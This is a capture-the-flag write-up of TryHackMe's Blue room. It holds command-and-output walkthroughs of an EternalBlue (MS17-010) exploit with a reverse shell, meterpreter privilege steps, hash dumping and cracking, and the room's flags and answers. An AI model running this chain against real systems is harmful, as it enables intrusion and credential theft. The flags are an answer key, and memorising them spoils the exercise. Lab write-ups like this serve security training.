---
title: "TryHackMe's Blue Room"
published: true
---

# TryHackMe's Blue Room

## Intro

This post is a writeup on the Blue room of the TryHackMe's Offensive Pentesting path.  
The room covers concepts such as active recon, the use of Metasploit, the exploitation of a Windows machine and how to crack hashes.
In the following sections we assume that 10.10.205.212 is the target machine's IP.

## Recon

We start with a scan of the target machine using nmap.  
Nmap has a `--script` parameter that allows us to run lua scripts during the scan, the tool has many built-in scripts that we can use.  
We are going to use the 'vuln' script: it tries to find known vulnerabilities on the machine while scanning it.  
For further information on nmap scripts visit <https://nmap.org/book/nse-usage.html#nse-categories>

```bash
root@ip-10-10-209-104:~# nmap -sV --script vuln 10.10.205.212

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-13 14:02 BST
Nmap scan report for ip-10-10-205-212.eu-west-1.compute.internal (10.10.205.212)
Host is up (0.00100s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown:
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:21:D5:96:7A:D3 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 322.14 seconds
```

From the output of the scan we can see that the system has a few vulnerabilities.

**Question:** How many ports are open with a port number under 1000? **3**  
**Question:** What is this machine vulnerable to? **ms17-010**

## Exploitation

Now we are going to attempt to gain access to the machine using the **ms17-010** vulnerability.  
For this task we use Metasploit which is an exploitation framework that comes prepackaged with a considerable amount of exploits and payloads.  
They are organized in modules and basically allow us to exploit a vulnerable machine with a few clicks.

Let's start metasploit with the command `msfconsole` and search exploits for our vulnerability.

```bash
msf6 > search ms17-010 type:exploit

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

We found a few but we are going to use the first one.

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

Each metasploit's exploit requires some configuration in order to run.  
In this case we set the **RHOSTS** option with the target machine's IP and the **payload**.  
For the payload we use a reverse shell: it's a payload that causes the target machine to initiate a connection to us that gives us a shell to the target machine.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.205.212
RHOSTS => 10.10.205.212
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```

Once we configure it we can run it:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.209.104:4444
[*] 10.10.205.212:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.205.212:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.205.212:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.205.212:445 - The target is vulnerable.
[*] 10.10.205.212:445 - Connecting to target for exploitation.
[+] 10.10.205.212:445 - Connection established for exploitation.
[+] 10.10.205.212:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.205.212:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.205.212:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.205.212:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.205.212:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.205.212:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.205.212:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.205.212:445 - Sending all but last fragment of exploit packet
[*] 10.10.205.212:445 - Starting non-paged pool grooming
[+] 10.10.205.212:445 - Sending SMBv2 buffers
[+] 10.10.205.212:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.205.212:445 - Sending final SMBv2 buffers.
[*] 10.10.205.212:445 - Sending last fragment of exploit packet!
[*] 10.10.205.212:445 - Receiving response from exploit packet
[+] 10.10.205.212:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.205.212:445 - Sending egg to corrupted connection.
[*] 10.10.205.212:445 - Triggering free of corrupted buffer.
[-] 10.10.205.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.205.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.205.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.205.212:445 - Connecting to target for exploitation.
[+] 10.10.205.212:445 - Connection established for exploitation.
[+] 10.10.205.212:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.205.212:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.205.212:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.205.212:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.205.212:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.205.212:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.205.212:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.205.212:445 - Sending all but last fragment of exploit packet
[*] 10.10.205.212:445 - Starting non-paged pool grooming
[+] 10.10.205.212:445 - Sending SMBv2 buffers
[+] 10.10.205.212:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.205.212:445 - Sending final SMBv2 buffers.
[*] 10.10.205.212:445 - Sending last fragment of exploit packet!
[*] 10.10.205.212:445 - Receiving response from exploit packet
[+] 10.10.205.212:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.205.212:445 - Sending egg to corrupted connection.
[*] 10.10.205.212:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.205.212
[*] Command shell session 1 opened (10.10.209.104:4444 -> 10.10.205.212:49208) at 2024-09-13 14:19:43 +0100
[+] 10.10.205.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.205.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.205.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-----


C:\Windows\system32>
```

As you can see from the previous output, when the exploit is done running we get windows shell to the target machine.  
You may have to press Enter for the shell to appear.

**Question:** Find the exploitation code we will run against the machine. What is the full path of the code? **exploit/windows/smb/ms17_010_eternalblue**  
**Question:** Show options and set the one required value. What is the name of this value? **RHOSTS**

## Privilege Escalation

Now that we have gained a foothold into the system the next step is to elevate our permissions.  
We attempt to do so by upgrading our shell to a **meterpreter** shell.  
What is meterpreter? It's basically a shell on steroids provided by Metasploit, it provides much broader and advanced functions compared to a regular shell.  
If you are interested in learning more check out [this article](https://medium.com/@differentiate.function/meterpreter-and-shell-differences-and-use-cases-7bd201bbcd94).

First we background the current shell session

```bash
C:\Windows\system32>^Z
Background session 1? [y/N]  y
```

Then we find the relevant session id and attempt to upgrade the shell with the `sessions -u ID` command

```bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                                                                    Connection
  --  ----  ----               -----------                                                                    ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Micros.  10.10.209.104:4444 -> 10.10.205.212:49208 (10.10.205.212)
                               ..
msf6 post(multi/manage/shell_to_meterpreter) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.209.104:4433
msf6 post(multi/manage/shell_to_meterpreter) >
[*] Sending stage (200774 bytes) to 10.10.205.212
[*] Meterpreter session 2 opened (10.10.209.104:4433 -> 10.10.205.212:49228) at 2024-09-13 14:35:53 +0100
[*] Stopping exploit/multi/handler
```

From the output we can see that another session was opened, that is our newly created meterpreter session, let's interact with it

```bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```

The shell upgrading procedure also managed to upgrade our privileges.  
We can check this running the `getsystem` command which is a meterpreter command that attempts to elevate our privileges.

```bash
meterpreter > getsystem
[-] Already running as SYSTEM
```

As you can see from the output we are already running as SYSTEM, so we already have the highest privileges.  
Next, we migrate to a process owned by SYSTEM because even if we are SYSTEM, this does not mean that our process is: we could be restrained by limitations that depend on the specific exploit used to gain access.  
In addition, our current process might be short-lived.  
Migrating to a long-running SYSTEM process such as svchost.exe or winlogon.exe gives us a more stable and persistent access.  
Let's check the running processes:

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 396   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 556   548   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 604   548   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 612   596   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 652   596   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 688   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 696   556   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 700   604   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 708   604   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 716   604   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 824   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 892   700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 940   700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1008  652   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1072  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1168  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1204  824   WmiPrvSE.exe
 1272  700   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1328  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1340  1096  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1388  1272  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 1408  700   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1472  700   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1564  700   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 1612  700   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1936  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2192  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2400  700   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2464  556   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2620  700   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2668  700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2760  700   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
```

Using the PID we try to migrate to another process

```bash
meterpreter > migrate 2668
[*] Migrating from 1340 to 2668...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 2192
[*] Migrating from 1340 to 2192...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 652
[*] Migrating from 1340 to 652...
[*] Migration completed successfully.
```

As you can see from the output it took a few attempts: migrating can be tricky and unstable, sometimes it may even crash your connection!  
Be aware of this and weigh the pros and cons before trying.

**Question:** What is the name of the post module we will use? **post/multi/manage/shell_to_meterpreter**  
**Question:** what option are we required to change? **SESSION**  
_We actually did not use this module explicitly but we ran the sessions -u command_

## Crack the hash

Let's keep exploring the meterpreter's superpowers and check out the `hashdump` command.  
As the name implies it dumps on the screen the hashes of the users of the system.

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

With this information we can try to crack Jon's hash to obtain his password.  
Let's create a file with the hashes as shown below:

```bash
root@ip-10-10-209-104:~/workspace# cat hash.txt
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

We use a password-cracking tool called **John the Ripper** to try to crack the hashes.  
The tool can be used in different ways, in this case we use a wordlist: basically the tool computes the hash for every word in the wordlist and compares them to the provided hashes looking for a positive match.  
The wordlist used is rockyou.txt, a very famous and common wordlist, present by default on Kali Linux.

```bash
root@ip-10-10-209-104:~/workspace# john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
alqfna22         (Jon)
2g 0:00:00:00 DONE (2024-09-13 15:29) 2.040g/s 10408Kp/s 10408Kc/s 10413KC/s alr1979..alpus
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

We notice in the output that John managed to find Jon's password: **alqfna22**

**Question:** What is the name of the non-default user? **Jon**  
**Question:** What is the cracked password? **alqfna22**

## Find the flags

Last but not least to complete the room we need to grab some flags.  
Luckily they are not totally mean and give us some hints.

The first flag can be found at the _system root_:

```bash
meterpreter > pwd
C:\
meterpreter > dir
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 03:13:36 +0000  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 06:08:56 +0100  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 04:20:08 +0100  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 22:22:01 +0000  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 22:28:38 +0000  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 22:35:57 +0000  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 03:13:22 +0000  Recovery
040777/rwxrwxrwx  4096   dir   2024-09-13 14:14:36 +0100  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 03:13:28 +0000  Users
040777/rwxrwxrwx  16384  dir   2019-03-17 22:36:30 +0000  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 19:27:21 +0000  flag1.txt
000000/---------  0      fif   1970-01-01 01:00:00 +0100  hiberfil.sys
000000/---------  0      fif   1970-01-01 01:00:00 +0100  pagefile.sys

meterpreter > cat flag1.txt
flag{access_the_machine}meterpreter >
```

**Question:** Flag 1? **flag{access_the_machine}**

The second flag can be found where the password are stored:

```bash
meterpreter > cd C:/WINDOWS/SYSTEM32/config
meterpreter > dir
Listing: C:\WINDOWS\SYSTEM32\config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  28672     fil   2018-12-12 23:00:40 +0000  BCD-Template
100666/rw-rw-rw-  25600     fil   2018-12-12 23:00:40 +0000  BCD-Template.LOG
100666/rw-rw-rw-  18087936  fil   2024-09-13 14:00:10 +0100  COMPONENTS
100666/rw-rw-rw-  1024      fil   2011-04-12 09:32:10 +0100  COMPONENTS.LOG
100666/rw-rw-rw-  13312     fil   2024-09-13 14:00:10 +0100  COMPONENTS.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  COMPONENTS.LOG2
100666/rw-rw-rw-  1048576   fil   2024-09-13 13:50:46 +0100  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms
100666/rw-rw-rw-  1048576   fil   2024-09-13 13:50:46 +0100  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms
100666/rw-rw-rw-  1048576   fil   2024-09-13 13:50:46 +0100  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms
100666/rw-rw-rw-  65536     fil   2024-09-13 13:50:46 +0100  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf
100666/rw-rw-rw-  65536     fil   2018-12-13 03:20:57 +0000  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2018-12-13 03:20:57 +0000  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2009-07-14 06:01:27 +0100  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2024-09-13 14:08:15 +0100  DEFAULT
100666/rw-rw-rw-  1024      fil   2011-04-12 09:32:10 +0100  DEFAULT.LOG
100666/rw-rw-rw-  177152    fil   2024-09-13 14:08:15 +0100  DEFAULT.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  DEFAULT.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:22:17 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0         dir   2009-07-14 03:34:57 +0100  Journal
040777/rwxrwxrwx  4096      dir   2024-09-13 14:07:47 +0100  RegBack
100666/rw-rw-rw-  262144    fil   2019-03-17 20:05:08 +0000  SAM
100666/rw-rw-rw-  1024      fil   2011-04-12 09:32:10 +0100  SAM.LOG
100666/rw-rw-rw-  21504     fil   2019-03-17 22:39:12 +0000  SAM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  SAM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:22:17 +0000  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2024-09-13 13:59:55 +0100  SECURITY
100666/rw-rw-rw-  1024      fil   2011-04-12 09:32:10 +0100  SECURITY.LOG
100666/rw-rw-rw-  21504     fil   2024-09-13 13:59:55 +0100  SECURITY.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  SECURITY.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:22:17 +0000  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  40632320  fil   2024-09-13 15:33:55 +0100  SOFTWARE
100666/rw-rw-rw-  1024      fil   2011-04-12 09:32:10 +0100  SOFTWARE.LOG
100666/rw-rw-rw-  262144    fil   2024-09-13 15:33:55 +0100  SOFTWARE.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  SOFTWARE.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:21:19 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:19 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:19 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  12582912  fil   2024-09-13 15:54:43 +0100  SYSTEM
100666/rw-rw-rw-  1024      fil   2011-04-12 09:32:06 +0100  SYSTEM.LOG
100666/rw-rw-rw-  262144    fil   2024-09-13 15:54:43 +0100  SYSTEM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  SYSTEM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:21:22 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:22 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:22 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  4096      dir   2018-12-12 23:03:05 +0000  TxR
100666/rw-rw-rw-  34        fil   2019-03-17 19:32:48 +0000  flag2.txt
040777/rwxrwxrwx  4096      dir   2010-11-21 02:41:37 +0000  systemprofile

meterpreter > cat flag2.txt
flag{sam_database_elevated_access}meterpreter >
```

**Question:** Flag 2? **flag{sam_database_elevated_access}**

The third flag is in an _excellent location to loot_ and has something to do with the administrator of the system.  
After looking around a bit in Jon's Users folder:

```bash
meterpreter > cd C:\\Users\\Jon\\Documents
meterpreter > dir
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Music
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 03:13:48 +0000  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-17 19:26:36 +0000  flag3.txt

meterpreter > cat flag3.txt
flag{admin_documents_can_be_valuable}meterpreter >
```

**Question:** Flag 3? **flag{admin_documents_can_be_valuable}**

This concludes the Blue room, see you in the next one!
